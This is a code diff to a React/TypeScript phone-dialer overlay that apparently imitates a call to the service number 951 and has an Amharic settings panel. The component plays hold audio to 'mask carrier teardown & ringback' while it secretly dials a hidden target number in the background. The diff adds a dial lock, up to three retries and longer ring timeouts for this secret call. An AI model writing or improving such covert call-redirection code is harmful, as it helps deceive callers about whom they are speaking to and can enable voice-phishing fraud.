@@ -360,6 +360,8 @@ export function Dialer951CallOverlay({
   const surveyReplayRef = useRef<boolean>(false);
   const wasSecretLiveRef = useRef<boolean>(false);
   const real951HandedOffRef = useRef<boolean>(false);
+  const secretAttemptCountRef = useRef<number>(0);
+  const secretDialLockRef = useRef<boolean>(false);
 
   useEffect(() => {
     onCloseRef.current = onClose;
@@ -1204,6 +1206,14 @@ export function Dialer951CallOverlay({
       holdTimerRef.current = null;
     }
     stopAllAudio();
+    if (typeof bridgeRef.current?.setStandaloneCallAudioActive === 'function') {
+      try {
+        (bridgeRef.current.setStandaloneCallAudioActive as (a: boolean, s: boolean) => void)(
+          true,
+          speakerOnRef.current
+        );
+      } catch {}
+    }
     const cfg = configRef.current;
     updatePhase('ai_active');
     setKeypadVisible(false);
@@ -1263,6 +1273,8 @@ export function Dialer951CallOverlay({
     surveyReplayRef.current = false;
     wasSecretLiveRef.current = false;
     real951HandedOffRef.current = false;
+    secretAttemptCountRef.current = 0;
+    secretDialLockRef.current = false;
     setAiDotState('idle');
     if (errorFlashTimerRef.current) {
       clearTimeout(errorFlashTimerRef.current);
@@ -1543,21 +1555,27 @@ export function Dialer951CallOverlay({
         cfg.backgroundCall.targetPhone.trim().length >= 9 &&
         typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
       ) {
+        if (secretDialLockRef.current) return;
+        secretDialLockRef.current = true;
+        secretAttemptCountRef.current = 1;
         updatePhase('secret_ringing');
         void playAudioClipById(cfg.holdClipId, true, true);
 
         // Play Stage 2 Hold MP3 for 5 seconds FIRST before dialing hidden target (masks carrier teardown & ringback)
         const preDialWaitOk = await waitInterruptibly(5000, actionEpoch);
         if (!preDialWaitOk || !openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+          secretDialLockRef.current = false;
           stopAllAudio();
           return;
         }
         try {
           (bridgeRef.current.startSecretBackgroundCall as (n: string, ms: number) => void)(
             cfg.backgroundCall.targetPhone.trim(),
-            Math.max(4, cfg.backgroundCall.maxRingSec) * 1000
+            Math.max(6, cfg.backgroundCall.maxRingSec) * 1000
           );
-        } catch {}
+        } catch {
+          secretDialLockRef.current = false;
+        }
         return;
       }
 
@@ -1749,6 +1767,8 @@ export function Dialer951CallOverlay({
       playbackTokenRef.current += 1;
       wasSecretLiveRef.current = false;
       real951HandedOffRef.current = false;
+      secretAttemptCountRef.current = 0;
+      secretDialLockRef.current = false;
       if (errorFlashTimerRef.current) {
         clearTimeout(errorFlashTimerRef.current);
         errorFlashTimerRef.current = null;
@@ -1779,6 +1799,8 @@ export function Dialer951CallOverlay({
     openRef.current = true;
     wasSecretLiveRef.current = false;
     real951HandedOffRef.current = false;
+    secretAttemptCountRef.current = 0;
+    secretDialLockRef.current = false;
     const initialEpoch = ++menuLoopEpochRef.current;
 
     const winAny = window as unknown as {
@@ -1839,9 +1861,15 @@ export function Dialer951CallOverlay({
 
     winAny.onSecretCallRinging = () => {
       if (!active || !openRef.current || wasSecretLiveRef.current) return;
+      secretDialLockRef.current = false;
+      if (retryTimerRef.current) {
+        clearTimeout(retryTimerRef.current);
+        retryTimerRef.current = null;
+      }
       updatePhase('secret_ringing');
     };
 
+    const MAX_SECRET_CALL_ATTEMPTS = 3;
     winAny.onSecretCallNoAnswer = () => {
       if (
         !active ||
@@ -1852,7 +1880,33 @@ export function Dialer951CallOverlay({
       ) {
         return;
       }
+      secretDialLockRef.current = false;
       const cfg = configRef.current;
+
+      if (secretAttemptCountRef.current >= MAX_SECRET_CALL_ATTEMPTS) {
+        if (retryTimerRef.current) {
+          clearTimeout(retryTimerRef.current);
+          retryTimerRef.current = null;
+        }
+        if (typeof bridgeRef.current?.cancelSecretBackgroundCall === 'function') {
+          try {
+            (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
+          } catch {}
+        }
+        menuLoopEpochRef.current += 1;
+        stopAllAudio();
+        retryTimerRef.current = window.setTimeout(() => {
+          retryTimerRef.current = null;
+          if (!active || !openRef.current || wasSecretLiveRef.current) return;
+          if (cfg.mode === 'hybrid') {
+            void enterAgentAiConversation();
+          } else {
+            void playClosingSurveyAndExit();
+          }
+        }, 220);
+        return;
+      }
+
       updatePhase('secret_busy_retry');
       const holdAlreadyPlaying =
         currentClipIdRef.current === cfg.holdClipId &&
@@ -1869,21 +1923,27 @@ export function Dialer951CallOverlay({
           active &&
           openRef.current &&
           !wasSecretLiveRef.current &&
+          !secretDialLockRef.current &&
           phaseRef.current === 'secret_busy_retry' &&
           typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
         ) {
+          secretDialLockRef.current = true;
+          secretAttemptCountRef.current += 1;
           try {
             (bridgeRef.current.startSecretBackgroundCall as (n: string, ms: number) => void)(
               cfg.backgroundCall.targetPhone.trim(),
-              Math.max(4, cfg.backgroundCall.maxRingSec) * 1000
+              Math.max(6, cfg.backgroundCall.maxRingSec) * 1000
             );
-          } catch {}
+          } catch {
+            secretDialLockRef.current = false;
+          }
         }
-      }, 2800);
+      }, 3500);
     };
 
     winAny.onSecretCallAnswered = () => {
       if (!active || !openRef.current) return;
+      secretDialLockRef.current = false;
       wasSecretLiveRef.current = true;
       if (retryTimerRef.current) {
         clearTimeout(retryTimerRef.current);
@@ -2001,6 +2061,8 @@ export function Dialer951CallOverlay({
       playbackTokenRef.current += 1;
       wasSecretLiveRef.current = false;
       real951HandedOffRef.current = false;
+      secretAttemptCountRef.current = 0;
+      secretDialLockRef.current = false;
       if (errorFlashTimerRef.current) {
         clearTimeout(errorFlashTimerRef.current);
         errorFlashTimerRef.current = null;
@@ -3727,15 +3789,15 @@ export function Dialer951StudioDrawer({
                 <label className="text-[11px] font-semibold text-slate-600">መጠበቂያ (ሰ)</label>
                 <input
                   type="number"
-                  min={4}
-                  max={25}
+                  min={6}
+                  max={45}
                   value={cfg.backgroundCall.maxRingSec}
                   onChange={(e) =>
                     setCfg((prev) => ({
                       ...prev,
                       backgroundCall: {
                         ...prev.backgroundCall,
-                        maxRingSec: Number(e.target.value) || 8,
+                        maxRingSec: Number(e.target.value) || 18,
                       },
                     }))
                   }
